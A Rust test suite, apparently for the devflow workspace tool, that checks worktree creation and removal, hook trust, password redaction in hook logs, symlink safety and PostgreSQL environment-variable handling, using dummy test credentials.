    };
    refused(&bare_remove(expecting(&bare, Some(uuid::Uuid::new_v4()))).unwrap_err());
    assert!(bare.path.exists());
    let error = remove(&moved, Some(expecting(&elsewhere.workspace, None)), false).unwrap_err();
    refused(&error);
    assert!(elsewhere.workspace.path.exists());
    assert!(!marker.exists());

    // The right view removes: teardown runs, then the worktree goes.
    bare_remove(expecting(&bare, None)).unwrap();
    assert!(!bare.path.exists());
    let current = expecting(&elsewhere.workspace, Some(elsewhere.receipt.instance_id));
    // A path spelled through a symlink or with `..` is the same path.
    let mut spelled = current.clone();
    spelled.path = elsewhere
        .workspace
        .path
        .join("..")
        .join(elsewhere.workspace.path.file_name().unwrap());
    remove(&moved, Some(spelled), false).unwrap();
    assert!(marker.exists(), "teardown ran");
    assert!(!elsewhere.workspace.path.exists());
}

#[test]
fn a_receipt_replaced_after_the_first_check_is_still_caught() {
    // The listing and the removal can be far apart; the receipt read under the
    // lock is what counts.
    let t = plain();
    let w = create(&t.project, "swap", SetupOptions::default()).unwrap();
    let shown = expecting(&w.workspace, Some(w.receipt.instance_id));
    // Fork it: same path, new identity.
    let out = setup::setup(
        &t.project,
        &w.workspace,
        SetupOptions::default(),
        false,
        true,
        &mut NoProgress,
    )
    .unwrap()
    .unwrap();
    assert_ne!(out.receipt.instance_id, w.receipt.instance_id);
    let error = setup::remove(
        &t.project,
        "swap",
        RemoveOptions {
            expect: Some(shown),
            ..Default::default()
        },
        &mut NoProgress,
    )
    .unwrap_err();
    assert!(
        error.to_string().contains("changed since it was shown"),
        "{error:#}"
    );
    assert!(w.workspace.path.exists());
    assert_eq!(receipt_of(&w.workspace), out.receipt);
}

#[test]
fn removing_a_workspace_that_contains_another_is_refused_even_forced() {
    let t = plain();
    let outer = create(&t.project, "outer", SetupOptions::default())
        .unwrap()
        .workspace;
    let mut nested = t.project.clone();
    nested.config.worktree.dir = outer.path.join("nested").to_string_lossy().into_owned();
    worktree::create(&nested, "inner", None).unwrap();
    let error = setup::remove(
        &t.project,
        "outer",
        RemoveOptions {
            force: true,
            ..Default::default()
        },
        &mut NoProgress,
    )
    .unwrap_err();
    assert!(error.to_string().contains("lives inside"), "{error:#}");
    assert!(!protection(&error).forceable);
    assert!(outer.path.exists());
}

#[test]
fn concurrent_creation_of_names_sharing_a_directory_leaves_one_intact_workspace() {
    let t = plain();
    let barrier = std::sync::Barrier::new(2);
    let results: Vec<_> = std::thread::scope(|scope| {
        let handles: Vec<_> = ["feature/a", "feature-a"]
            .into_iter()
            .map(|name| {
                let (project, barrier) = (&t.project, &barrier);
                scope.spawn(move || {
                    barrier.wait();
                    create(project, name, SetupOptions::default())
                })
            })
            .collect();
        handles.into_iter().map(|h| h.join().unwrap()).collect()
    });
    let winners: Vec<_> = results.iter().filter_map(|r| r.as_ref().ok()).collect();
    assert_eq!(winners.len(), 1, "{results:?}");
    let error = results.iter().find_map(|r| r.as_ref().err()).unwrap();
    assert!(error.to_string().contains("already exists"), "{error:#}");

    let winner = winners[0];
    assert_eq!(winner.status, Status::Ready);
    assert!(winner.workspace.path.join("README.md").is_file());
    assert_eq!(receipt_of(&winner.workspace), winner.receipt);
    let all = worktree::list(&t.project).unwrap();
    assert_eq!(all.len(), 2);
    assert!(!all[1].missing);
}

#[test]
fn a_symlinked_devflow_directory_is_never_written_through() {
    let t = plain();
    let w = worktree::create(&t.project, "linked", None).unwrap();
    let outside = tempfile::tempdir().unwrap();
    let sentinel = outside.path().join("env");
    std::fs::write(&sentinel, "belongs to someone else").unwrap();
    std::os::unix::fs::symlink(outside.path(), w.path.join(".devflow")).unwrap();

    let error = setup::setup(
        &t.project,
        &w,
        SetupOptions::default(),
        false,
        false,
        &mut NoProgress,
    )
    .unwrap_err();
    assert!(format!("{error:#}").contains("symlink"), "{error:#}");
    assert_eq!(
        std::fs::read_to_string(&sentinel).unwrap(),
        "belongs to someone else"
    );
    assert!(!outside.path().join(".gitignore").exists());
    let receipt = receipt_of(&w);
    assert_eq!(receipt.phase(Phase::Env).state, PhaseState::Failed);
    assert_eq!(receipt.status(), Status::NeedsAttention);

    // Fixing it lets the same setup resume and finish.
    std::fs::remove_file(w.path.join(".devflow")).unwrap();
    let out = setup::setup(
        &t.project,
        &w,
        SetupOptions::default(),
        false,
        false,
        &mut NoProgress,
    )
    .unwrap()
    .unwrap();
    assert_eq!(out.status, Status::Ready);
    assert!(env_file::path(&w.path).is_file());
}

#[test]
fn hook_output_and_logs_never_contain_the_database_password() {
    let t = repo(
        &Hooks {
            setup: &[
                "echo \"pw=$PGPASSWORD url=$DATABASE_URL\"",
                "echo \"again $PGPASSWORD\" >&2",
                "echo PGPASSWORD=Sup3rSecretPw psql",
            ],
            ..Default::default()
        },
        "",
    );
    let mut rec = Recorder::default();
    let out = setup::create(
        &t.project,
        CreateRequest {
            name: "creds".into(),
            from: None,
            base: None,
            options: SetupOptions {
                database_url: Some("postgres://app:Sup3rSecretPw@localhost:5439/app".into()),
                approval: Some(trust::Approval::of(&trust::scope(&t.project))),
                ..Default::default()
            },
        },
        &mut rec,
    )
    .unwrap();
    assert_eq!(out.status, Status::Ready);
    let report = out.hooks.as_ref().unwrap();
    assert!(report.ok, "{report:?}");
    let log = std::fs::read_to_string(report.log.as_ref().unwrap()).unwrap();
    assert!(log.contains("pw=***"), "{log}");
    assert!(!log.contains("Sup3rSecretPw"), "{log}");
    assert!(
        rec.lines.iter().all(|l| !l.contains("Sup3rSecretPw")),
        "{:?}",
        rec.lines
    );
    assert!(
        rec.lines
            .iter()
            .any(|l| l.contains("url=postgres://app:***@localhost:5439/app")),
        "{:?}",
        rec.lines
    );
    // The generated env file is the one place that must keep it.
    assert_eq!(env_map(&out.workspace)["PGPASSWORD"], "Sup3rSecretPw");
}

#[test]
fn create_and_activate_enters_the_new_workspace_like_a_switch() {
    let t = repo(
        &Hooks {
            switch: &["touch .devflow/switch-ran"],
            ..Default::default()
        },
        "",
    );
    let ran = |w: &Workspace| w.path.join(".devflow/switch-ran").exists();
    let enter = |name: &str, options: SetupOptions| {
        setup::create_and_activate(
            &t.project,
            CreateRequest {
                name: name.into(),
                from: None,
                base: None,
                options,
            },
            &mut NoProgress,
        )
        .unwrap()
    };
    // Untrusted: nothing runs, and the outcome says why.
    let out = enter("first", SetupOptions::default());
    assert!(out.switch_hooks.is_none() && !ran(&out.workspace));
    assert!(
        out.warnings.iter().any(|w| w.contains("not trusted")),
        "{:?}",
        out.warnings
    );
    assert!(out.receipt.last_active_at.is_some());

    trust::approve(&t.project).unwrap();
    // Plain `create` is not an entry: no switch hooks, no activation record.
    let out = create(&t.project, "second", SetupOptions::default()).unwrap();
    assert!(out.switch_hooks.is_none() && !ran(&out.workspace));
    assert!(out.receipt.last_active_at.is_none());

    let out = enter("third", SetupOptions::default());
    assert_eq!(out.status, Status::Ready);
    let report = out.switch_hooks.expect("trusted and ready");
    assert!(report.ok && report.runs.len() == 1);
    assert!(ran(&out.workspace));
    assert!(out.hooks.is_none(), "there are no setup hooks");

    // --no-hooks.
    let out = enter(
        "fourth",
        SetupOptions {
            no_hooks: true,
            ..Default::default()
        },
    );
    assert!(out.switch_hooks.is_none() && !ran(&out.workspace));
}

#[test]
fn devflow_instance_id_forks_a_copied_receipt() {
    const NAME: &str = "devflow_instance_id_forks_a_copied_receipt";
    let named = "6f1d3a1e-7a53-4c83-9a2f-0f1a2b3c4d5e";
    if !in_child(NAME, &[("DEVFLOW_INSTANCE_ID", named)]) {
        return;
    }
    let named: uuid::Uuid = named.parse().unwrap();
    let t = repo(
        &Hooks {
            setup: &["echo \"$DEVFLOW_WORKSPACE_ID\" > .devflow/marker"],
            ..Default::default()
        },
        "",
    );
    trust::approve(&t.project).unwrap();
    let started = |rec: &Recorder| -> Vec<Phase> {
        rec.phases
            .iter()
            .filter(|(_, s)| *s == PhaseState::Started)
            .map(|(p, _)| *p)
            .collect()
    };
    let rerun = |w: &Workspace, if_new: bool, rec: &mut Recorder| {
        setup::setup(&t.project, w, SetupOptions::default(), if_new, false, rec).unwrap()
    };

    // Creating does not honour the override: the receipt is born with its own id.
    let first = create(&t.project, "vm", SetupOptions::default()).unwrap();
    assert_ne!(first.receipt.instance_id, named);
    assert_ne!(Receipt::new(t.project.id(), "x", None).instance_id, named);
    let w = first.workspace;

    // The explicit `setup` obeys it: a receipt of another instance is a copy
    // (even with `--if-new` on a ready receipt), and the id becomes the identity.
    let (old, branch) = (first.receipt.instance_id, uuid::Uuid::new_v4());
    let mut copied = receipt_of(&w);
    copied.data_source = Some("workspace:main".into());
    copied.services.insert(
        "db".into(),
        ServiceBinding::postgres(
            DataBinding {
                branch_id: Some(branch),
                database: "df_a_b".into(),
                role: "dfl_b".into(),
                url: "postgres://dfl_b:pw@old-host:5432/df_a_b".into(), // kingfisher:ignore
                source: "workspace:main".into(),
                owned: true,
            },
            None,
        ),
    );
    copied.save(&w.git_dir).unwrap();
    std::fs::remove_file(w.path.join(".devflow/marker")).unwrap();
    let mut rec = Recorder::default();
    let out = rerun(&w, true, &mut rec).expect("forked instead of skipped");
    assert_eq!(out.receipt.instance_id, named);
    assert_ne!(out.receipt.instance_id, old);
    assert!(
        out.receipt.services.is_empty(),
        "the owned binding lost its authority"
    );
    assert_eq!(out.receipt.data_source, Some(format!("branch:{branch}")));
    assert_eq!(
        started(&rec),
        vec![Phase::Services, Phase::Env, Phase::Hooks]
    );
    assert_eq!(env_map(&w)["DEVFLOW_WORKSPACE_ID"], named.to_string());
    assert!(!env_map(&w).contains_key("DEVFLOW_INSTANCE_ID"));
    assert_eq!(
        std::fs::read_to_string(w.path.join(".devflow/marker"))
            .unwrap()
            .trim(),
        named.to_string()
    );
    assert_eq!(receipt_of(&w), out.receipt);

    // The same override again changes nothing.
    let mut rec = Recorder::default();
    assert!(rerun(&w, true, &mut rec).is_none());
    let out = rerun(&w, false, &mut rec).unwrap();
    assert!(started(&rec).is_empty());
    assert_eq!(out.receipt.instance_id, named);

    // A receipt without an identity of its own (an adopted worktree) takes it.
    let raw = worktree::create(&t.project, "raw", None).unwrap();
    // `named` already belongs to `vm`: refused, and nothing is written.
    let error = setup::setup(
        &t.project,
        &raw,
        SetupOptions::default(),
        false,
        false,
        &mut NoProgress,
    )
    .unwrap_err();
    assert!(
        format!("{error:#}").contains("recorded for workspace 'vm'"),
        "{error:#}"
    );
    assert!(Receipt::load(&raw.git_dir).unwrap().is_none());
}

#[test]
fn sourcing_one_workspaces_env_does_not_fork_another_workspace() {
    // The reviewer's scenario: `source A/.devflow/env`, then work on B. With the
    // old export that put A's id in DEVFLOW_INSTANCE_ID and every command about
    // B treated it as a fork request.
    const NAME: &str = "sourcing_one_workspaces_env_does_not_fork_another_workspace";
    let a_id = "0a1b2c3d-4e5f-4a6b-8c7d-9e0f1a2b3c4d";
    if !in_child(NAME, &[("DEVFLOW_INSTANCE_ID", a_id)]) {
        return;
    }
    let a_id: uuid::Uuid = a_id.parse().unwrap();
    let t = repo(
        &Hooks {
            switch: &["touch .devflow/switched"],
            ..Default::default()
        },
        "",
    );
    trust::approve(&t.project).unwrap();
    // A carries the id the shell has; B is attached to a database by URL.
    let a = create(&t.project, "a", SetupOptions::default()).unwrap();
    let mut receipt = receipt_of(&a.workspace);
    receipt.instance_id = a_id;
    receipt.save(&a.workspace.git_dir).unwrap();
    let url = "postgres://b:pw@db.internal:5432/b_data";
    let b = create(
        &t.project,
        "b",
        SetupOptions {
            database_url: Some(url.into()),
            ..Default::default()
        },
    )
    .unwrap();
    let b_receipt = b.receipt.clone();
    assert_ne!(b_receipt.instance_id, a_id);
    assert_eq!(b_receipt.services["db"].url, url);

    // What A's env file offers a sourcing shell is informational only.
    let a_env = env_map(&a.workspace);
    assert!(!a_env.contains_key("DEVFLOW_INSTANCE_ID"));
    assert_eq!(
        env_file::read(&a.workspace.path).unwrap().len(),
        a_env.len()
    );

    let unchanged = |what: &str| {
        // Entering a workspace records when, and nothing else.
        let mut now = receipt_of(&b.workspace);
        now.last_active_at = None;
        assert_eq!(now, b_receipt, "{what}");
        assert_eq!(env_map(&b.workspace)["DATABASE_URL"], url, "{what}");
    };
    let mut rec = Recorder::default();
    let out = setup::activate(&t.project, &b.workspace, SetupOptions::default(), &mut rec).unwrap();
    assert_eq!(out.status, Status::Ready);
    assert!(out.switch_hooks.is_some(), "the switch hook ran");
    assert!(
        rec.phases.iter().all(|(_, s)| *s != PhaseState::Started),
        "no phase re-ran: {:?}",
        rec.phases
    );
    unchanged("switch");

    // Creating over an unfinished B resumes it instead of forking it.
    let mut unfinished = receipt_of(&b.workspace);
    unfinished.set_phase(Phase::Hooks, PhaseState::Pending, None);
    unfinished.save(&b.workspace.git_dir).unwrap();
    let resumed = create(&t.project, "b", SetupOptions::default()).unwrap();
    assert_eq!(resumed.receipt.instance_id, b_receipt.instance_id);
    assert_eq!(resumed.receipt.services, b_receipt.services);

    setup::activate(
        &t.project,
        &b.workspace,
        trusted(&t.project),
        &mut NoProgress,
    )
    .unwrap();
    assert_eq!(receipt_of(&b.workspace).instance_id, b_receipt.instance_id);
    assert_eq!(
        setup::list(&t.project).unwrap()[2]
            .receipt
            .as_ref()
            .unwrap()
            .instance_id,
        b_receipt.instance_id
    );
    assert_eq!(env_map(&b.workspace)["DATABASE_URL"], url);

    // Explicit `setup` in B with A's id is refused, and B stays as it was.
    for if_new in [false, true] {
        let error = setup::setup(
            &t.project,
            &b.workspace,
            SetupOptions::default(),
            if_new,
            false,
            &mut NoProgress,
        )
        .unwrap_err();
        assert!(
            format!("{error:#}").contains("recorded for workspace 'a'"),
            "{error:#}"
        );
        assert_eq!(receipt_of(&b.workspace).instance_id, b_receipt.instance_id);
        assert_eq!(receipt_of(&b.workspace).services, b_receipt.services);
    }
    // ...while in A itself the same id is simply A's own: nothing to do.
    let out = setup::setup(
        &t.project,
        &a.workspace,
        SetupOptions::default(),
        true,
        false,
        &mut NoProgress,
    )
    .unwrap();
    assert!(out.is_none());
    assert_eq!(receipt_of(&a.workspace).instance_id, a_id);

    // Removing B is not steered by the variable either.
    let removed =
        setup::remove(&t.project, "b", RemoveOptions::default(), &mut NoProgress).unwrap();
    assert_eq!(removed.workspace.name, "b");
    assert_eq!(receipt_of(&a.workspace).instance_id, a_id);
}

#[test]
fn devflow_trust_hooks_trusts_setup_switch_and_teardown_alike() {
    const NAME: &str = "devflow_trust_hooks_trusts_setup_switch_and_teardown_alike";
    if !in_child(NAME, &[("DEVFLOW_TRUST_HOOKS", "1")]) {
        return;
    }
    let t = repo(
        &Hooks {
            setup: &["touch .devflow/setup-ran"],
            switch: &["touch .devflow/switch-ran"],
            teardown: &["touch ../teardown-ran"],
        },
        "",
    );
    assert!(
        matches!(
            trust::state(&t.project).unwrap(),
            trust::TrustState::Untrusted { .. }
        ),
        "nothing was approved"
    );
    let out = create(&t.project, "ci", SetupOptions::default()).unwrap();
    assert_eq!(out.status, Status::Ready, "{:?}", out.receipt.phases);
    assert!(out.workspace.path.join(".devflow/setup-ran").exists());

    let out = setup::activate(
        &t.project,
        &out.workspace,
        SetupOptions::default(),
        &mut NoProgress,
    )
    .unwrap();
    assert!(out.warnings.is_empty(), "{:?}", out.warnings);
    assert!(out.switch_hooks.unwrap().ok);
    assert!(out.workspace.path.join(".devflow/switch-ran").exists());

    let removed =
        setup::remove(&t.project, "ci", RemoveOptions::default(), &mut NoProgress).unwrap();
    assert!(removed.hooks.unwrap().ok, "teardown ran without --force");
    assert!(removed.warnings.is_empty(), "{:?}", removed.warnings);
    assert!(
        removed
            .workspace
            .path
            .parent()
            .unwrap()
            .join("teardown-ran")
            .exists()
    );
}

#[test]
fn generated_pg_variables_agree_with_database_url_and_unusable_urls_fail_up_front() {
    let t = repo(
        &Hooks {
            setup: &[
                "echo \"$PGHOST|$PGHOSTADDR|$PGPORT|$PGSSLMODE|$PGDATABASE|${PGSCHEMA-unset}\" > .devflow/seen",
            ],
            ..Default::default()
        },
        "",
    );
    let attach = |name: &str, url: &str| {
        create(
            &t.project,
            name,
            SetupOptions {
                database_url: Some(url.into()),
                approval: Some(trust::Approval::of(&trust::scope(&t.project))),
                ..Default::default()
            },
        )
    };

    // hostaddr is kept and a repeated sslmode resolves to the last value, so a
    // hook's psql goes where DATABASE_URL goes. Prisma-style `schema=` stays in
    // the URL and is not a libpq setting.
    let url = "postgres://app:pw@db.example:6543/app?hostaddr=192.0.2.44&sslmode=disable&sslmode=require&schema=public";
    let out = attach("hostaddr", url).unwrap();
    let env = env_map(&out.workspace);
    assert_eq!(env["DATABASE_URL"], url);
    assert_eq!(env["PGHOST"], "db.example");
    assert_eq!(env["PGHOSTADDR"], "192.0.2.44");
    assert_eq!(env["PGPORT"], "6543");
    assert_eq!(env["PGSSLMODE"], "require");
    assert_eq!(env["PGDATABASE"], "app");
    assert!(
        env.keys()
            .all(|k| !k.to_ascii_lowercase().contains("schema")),
        "{env:?}"
    );
    assert_eq!(
        std::fs::read_to_string(out.workspace.path.join(".devflow/seen"))
            .unwrap()
            .trim(),
        "db.example|192.0.2.44|6543|require|app|unset"
    );
    let binding = out.receipt.services["db"].clone();
    assert_eq!(
        (binding.database.as_str(), binding.role.as_str()),
        ("app", "app")
    );

    // IPv6 literal, and a query-string password with an encoded name.
    let out = attach("v6", "postgresql://u@[2001:db8::7]:5433/d?%70assword=p%2Fw").unwrap();
    let env = env_map(&out.workspace);
    assert_eq!(env["PGHOST"], "2001:db8::7");
    assert_eq!(env["PGPORT"], "5433");
    assert_eq!(env["PGPASSWORD"], "p/w");
    assert_eq!(
        env["DATABASE_URL"],
        "postgresql://u@[2001:db8::7]:5433/d?%70assword=p%2Fw"
    );

    // Rejected before anything is created: no worktree, no branch, no receipt.
    for (bad, expected) in [
        ("postgres://u:topsecret@h1,h2/d", "several hosts"),
        ("postgres://u:topsecret@h/d?sslpassword=x", "sslpassword"),
        (
            "postgres://u:topsecret@h/d?replication=database",
            "replication",
        ),
        ("mysql://u:topsecret@h/d", "postgres://"),
        ("host=h password=topsecret", "postgres://"),
    ] {
        let name = format!("bad-{}", expected.replace(['/', ':', ' '], ""));
        let error = attach(&name, bad).unwrap_err();
        let shown = format!("{error:#}");
        assert!(shown.contains("--database-url"), "{bad}: {shown}");
        assert!(shown.contains(expected), "{bad}: {shown}");
        assert!(!shown.contains("topsecret"), "{shown}");
        assert!(
            worktree::find(&t.project, &name).unwrap().is_none(),
            "{bad}"
        );
        assert!(
            t.project
                .repo()
                .unwrap()
                .find_branch(&name, git2::BranchType::Local)
                .is_err(),
            "{bad}: no branch left behind"
        );
    }
    assert_eq!(worktree::list(&t.project).unwrap().len(), 3);
    // An existing worktree is checked the same way before setup touches it.
    let raw = worktree::create(&t.project, "existing", None).unwrap();
    let error = setup::setup(
        &t.project,
        &raw,
        SetupOptions {
            database_url: Some("postgres://u@h1,h2/d".into()),
            ..Default::default()
        },
        false,
        false,
        &mut NoProgress,
    )
    .unwrap_err();
    assert!(format!("{error:#}").contains("several hosts"), "{error:#}");
    assert!(Receipt::load(&raw.git_dir).unwrap().is_none());
}

#[test]
fn hooks_see_the_workspace_connection_not_inherited_libpq_variables() {
    const NAME: &str = "hooks_see_the_workspace_connection_not_inherited_libpq_variables";
    let inherited = [
        ("PGPORT", "6543"),
        ("PGHOST", "inherited.example"),
        ("PGSERVICE", "svc"),
        ("PGHOSTADDR", "10.9.9.9"),
        ("PGOPTIONS", "-c x=1"),
        ("PGPASSWORD", "inherited-secret"),
        // Not named by the URL below, so they must be gone, not merely differ.
        ("PGSSLMODE", "disable"),
        ("PGSSLROOTCERT", "/inherited/ca.pem"),
        ("PGPASSFILE", "/inherited/pgpass"),
        ("PGCONNECT_TIMEOUT", "99"),
        ("PGAPPNAME", "inherited"),
        ("PGSERVICEFILE", "/inherited/services"),
        ("PGSYSCONFDIR", "/inherited/etc"),
    ];
    if !in_child(NAME, &inherited) {
        return;
    }
    let t = repo(
        &Hooks {
            setup: &[
                "echo \"$PGHOST|$PGPORT|$PGUSER|$PGDATABASE|${PGSERVICE-unset}|${PGHOSTADDR-unset}|${PGOPTIONS-unset}|$PGPASSWORD\" > .devflow/seen",
                "echo \"${PGSSLMODE-unset}|${PGSSLROOTCERT-unset}|${PGPASSFILE-unset}|${PGCONNECT_TIMEOUT-unset}|${PGAPPNAME-unset}|${PGSERVICEFILE-unset}|${PGSYSCONFDIR-unset}\" > .devflow/seen-more",
            ],
            ..Default::default()
        },
        "",
    );
    // The port is only given as a query parameter.
    let out = create(
        &t.project,
        "attached",
        SetupOptions {
            database_url: Some("postgres://app:s3cretpw@localhost/app?port=5434".into()),
            approval: Some(trust::Approval::of(&trust::scope(&t.project))),
            ..Default::default()
        },
    )
    .unwrap();
    let env = env_map(&out.workspace);
    assert_eq!(env["PGPORT"], "5434");
    assert_eq!(env["PGHOST"], "localhost");
    assert_eq!(env["PGUSER"], "app");
    assert_eq!(env["PGDATABASE"], "app");
    assert_eq!(
        std::fs::read_to_string(out.workspace.path.join(".devflow/seen"))
            .unwrap()
            .trim(),
        "localhost|5434|app|app|unset|unset|unset|s3cretpw"
    );
    assert_eq!(
        std::fs::read_to_string(out.workspace.path.join(".devflow/seen-more"))
            .unwrap()
            .trim(),
        "unset|unset|unset|unset|unset|unset|unset",
        "every connection-affecting variable is cleared, not just the common ones"
    );

    // A project with no PostgreSQL service and a workspace without a
    // database: there is nothing to disagree with, the user's own
    // environment is left alone.
    let out = create(
        &t.project,
        "nodb",
        SetupOptions {
            no_db: true,
            approval: Some(trust::Approval::of(&trust::scope(&t.project))),
            ..Default::default()
        },
    )
    .unwrap();
    assert_eq!(
        std::fs::read_to_string(out.workspace.path.join(".devflow/seen"))
            .unwrap()
            .trim(),
        "inherited.example|6543|||svc|10.9.9.9|-c x=1|inherited-secret"
    );
    assert_eq!(
        std::fs::read_to_string(out.workspace.path.join(".devflow/seen-more"))
            .unwrap()
            .trim(),
        "disable|/inherited/ca.pem|/inherited/pgpass|99|inherited|/inherited/services|/inherited/etc"
    );

    // A project that has a PostgreSQL service owns its variables even in a
    // `--no-db` workspace, which sets none of them: the caller's database is
    // not this workspace's.
    let t = repo(
        &Hooks {
            setup: &[
                "echo \"${DATABASE_URL-unset}|${PGHOST-unset}|${PGPORT-unset}|${PGSERVICE-unset}|${PGPASSWORD-unset}\" > .devflow/seen",
                "echo \"${PGSSLMODE-unset}|${PGSSLROOTCERT-unset}|${PGSYSCONFDIR-unset}\" > .devflow/seen-more",
            ],
            ..Default::default()
        },
        "[services.db]\nengine = \"postgres\"\nmode = \"external\"\n",
    );
    let out = create(
        &t.project,
        "nodb",
        SetupOptions {
            no_db: true,
            approval: Some(trust::Approval::of(&trust::scope(&t.project))),
            ..Default::default()
        },
    )
    .unwrap();
    assert_eq!(out.status, Status::Ready, "{:?}", out.receipt.phases);
    assert_eq!(
        std::fs::read_to_string(out.workspace.path.join(".devflow/seen"))
            .unwrap()
            .trim(),
        "unset|unset|unset|unset|unset"
    );
    assert_eq!(
        std::fs::read_to_string(out.workspace.path.join(".devflow/seen-more"))
            .unwrap()
            .trim(),
        "unset|unset|unset"
    );
}

#[test]
fn setup_names_the_copied_dotenv_files_that_set_what_the_workspace_owns() {
    let t = plain();
    // The main checkout's `.env` is copied into the new workspace.
    std::fs::write(
        t.root.join(".env"),
        "DATABASE_URL=postgres://main:main-password-9@localhost/main\nPORT=3000\n", // kingfisher:ignore
    )
    .unwrap();
    let out = create(
        &t.project,
        "w",
        SetupOptions {
            database_url: Some("postgres://app:other-pw-1@localhost/app".into()), // kingfisher:ignore
            ..Default::default()
        },
    )
    .unwrap();
    let found: Vec<&String> = out
        .warnings
        .iter()
        .filter(|w| w.starts_with(".env sets"))
        .collect();
    assert_eq!(found.len(), 1, "{:?}", out.warnings);
    assert!(found[0].contains("DATABASE_URL"), "{}", found[0]);
    assert!(!found[0].contains("PORT"), "{}", found[0]);
    assert!(
        !found[0].contains("main-password") && !found[0].contains("other-pw"),
        "{}",
        found[0]
    );
}

// --- the names a workspace owns stay current ---------------------------------

/// The names `.devflow/env` of `ws` lists as declared.
fn declared_names(ws: &Workspace) -> std::collections::BTreeSet<String> {
    env_file::read_contents(&ws.path)
        .unwrap()
        .declared
        .expect("the file lists the names the workspace owns")
}

fn listed(project: &Project, name: &str) -> setup::WorkspaceStatus {
    setup::list(project)
        .unwrap()
        .into_iter()
        .find(|item| item.workspace.name == name)
        .unwrap()
}

#[test]
fn a_no_db_workspace_lists_a_service_that_comes_or_changes_the_variable_it_exports() {
    let t = repo(&Hooks::default(), "");
    let out = create(
        &t.project,
        "w",
        SetupOptions {
            no_db: true,
            ..Default::default()
        },
    )
    .unwrap();
    let w = out.workspace;
    assert!(!declared_names(&w).contains("DATABASE_URL"));

    // PostgreSQL comes. No service applies to the workspace (it has none by
    // choice), but it now owns what the service exports: the file must say so,
    // and a plain shell's `DATABASE_URL` must not reach a command through it.
    let project = edit_config(&t, |text| text + SERVICE);
    let item = listed(&project, "w");
    assert_eq!(item.status, Some(Status::NeedsAttention));
    let receipt = item.receipt.unwrap();
    assert!(receipt.phase(Phase::Env).required_skip);
    let services = receipt.phase(Phase::Services);
    assert!(
        services.deliberate && !services.required_skip,
        "{services:?}"
    );
    let again = setup::setup(
        &project,
        &w,
        SetupOptions::default(),
        false,
        false,
        &mut NoProgress,
    )
    .unwrap()
    .unwrap();
    assert_eq!(again.status, Status::Ready, "{:?}", again.receipt.phases);
    assert!(again.receipt.services.is_empty(), "still no database");
    let declared = declared_names(&w);
    assert!(declared.contains("DATABASE_URL") && declared.contains("PGHOST"));
    let prepared = devflow_core::exec::prepare_root(&w.path).unwrap();
    let mut command = std::process::Command::new("sh");
    command
        .args(["-c", "printf %s \"${DATABASE_URL-unset}\""])
        .env("DATABASE_URL", "postgres://plain-shell/db");
    prepared.apply(&mut command);
    assert_eq!(
        String::from_utf8(command.output().unwrap().stdout).unwrap(),
        "unset"
    );

    // A service that exports another variable.
    let project = edit_config(&t, |text| {
        text + "\n[services.cache]\nengine = \"valkey\"\nenv = \"CACHE_URL\"\n"
    });
    assert_eq!(listed(&project, "w").status, Some(Status::NeedsAttention));
    setup::setup(
        &project,
        &w,
        SetupOptions::default(),
        false,
        false,
        &mut NoProgress,
    )
    .unwrap()
    .unwrap();
    assert!(declared_names(&w).contains("CACHE_URL"));
    let project = edit_config(&t, |text| text.replace("CACHE_URL", "STORE_URL"));
    assert_eq!(listed(&project, "w").status, Some(Status::NeedsAttention));
    setup::setup(
        &project,
        &w,
        SetupOptions::default(),
        false,
        false,
        &mut NoProgress,
    )
    .unwrap()
    .unwrap();
    let declared = declared_names(&w);
    assert!(declared.contains("STORE_URL") && !declared.contains("CACHE_URL"));
    assert_eq!(listed(&project, "w").status, Some(Status::Ready));

    // Exporting the same names is not a change to the file.
    let project = edit_config(&t, |text| {
        text.replace(
            "engine = \"valkey\"",
            "engine = \"valkey\"\nimage = \"valkey/valkey:9-alpine\"",
        )
    });
    assert_eq!(listed(&project, "w").status, Some(Status::Ready));
}

/// The generation a `--no-db` workspace recorded before it covered the names
/// the configuration declares (main's devflow, the first build that kept the
/// manifest): a digest of the `[env]` section alone. Written out here because
/// it is a fixed, old format.
fn legacy_no_db_generation(config: &Config) -> String {
    use sha2::{Digest, Sha256};
    let json = serde_json::to_vec(&("env.v2.no-services", config.env.canonical())).unwrap();
    Sha256::digest(json)
        .iter()
        .map(|b| format!("{b:02x}"))
        .collect()
}

#[test]
fn an_upgraded_no_db_workspace_is_migrated_and_then_notices_a_service() {
    let t = repo(
        &Hooks {
            setup: &["echo run >> .devflow/runs"],
            ..Default::default()
        },
        "",
    );
    trust::approve(&t.project).unwrap();
    let w = create(
        &t.project,
        "w",
        SetupOptions {
            no_db: true,
            ..trusted(&t.project)
        },
    )
    .unwrap()
    .workspace;
    let runs = |w: &Workspace| {
        std::fs::read_to_string(w.path.join(".devflow/runs"))
            .unwrap()
            .lines()
            .count()
    };
    assert_eq!(runs(&w), 1);
    // The state an upgrade meets: the generation of an earlier devflow, which
    // covered the `[env]` section alone, on a file that already has a manifest.
    let mut receipt = receipt_of(&w);
    receipt.env_generation = Some(legacy_no_db_generation(&t.project.config));
    receipt.save(&w.git_dir).unwrap();
    assert!(!env_file::lacks_manifest(&w.path));
    assert!(!declared_names(&w).contains("DATABASE_URL"));

    // PostgreSQL is added. The old generation cannot see it: no drift, the
    // workspace reads ready, and no hook is reopened for it...
    let project = edit_config(&t, |text| text + SERVICE);
    let item = listed(&project, "w");
    assert_eq!(item.status, Some(Status::Ready));
    // ...but the list says the file is behind, and nothing short-circuits it.
    assert_eq!(item.env_file, Some(EnvFileProblem::OldGeneration));
    assert!(
        !EnvFileProblem::OldGeneration
            .describe()
            .contains("`devflow"),
        "a message names the file, never a command"
    );
    // A plain shell's database reaches a command through the file as it is.
    let through_exec = |w: &Workspace| {
        let prepared = devflow_core::exec::prepare_root(&w.path).unwrap();
        let mut command = std::process::Command::new("sh");
        command
            .args(["-c", "printf %s \"${DATABASE_URL-unset}\""])
            .env("DATABASE_URL", "postgres://plain-shell/db");
        prepared.apply(&mut command);
        String::from_utf8(command.output().unwrap().stdout).unwrap()
    };
    assert_eq!(through_exec(&w), "postgres://plain-shell/db");

    // `--if-new` does not leave it alone, and the repair runs no hook and
    // provisions nothing: the file now lists what PostgreSQL gives the
    // workspace, and the current generation is recorded.
    let out = setup::setup(
        &project,
        &w,
        SetupOptions::default(),
        true,
        false,
        &mut NoProgress,
    )
    .unwrap()
    .expect("the repair ran");
    assert_eq!(out.repaired, [Repair::EnvFile]);
    assert_eq!(out.status, Status::Ready, "{:?}", out.receipt.phases);
    let declared = declared_names(&w);
    assert!(declared.contains("DATABASE_URL") && declared.contains("PGHOST"));
    assert_eq!(through_exec(&w), "unset");
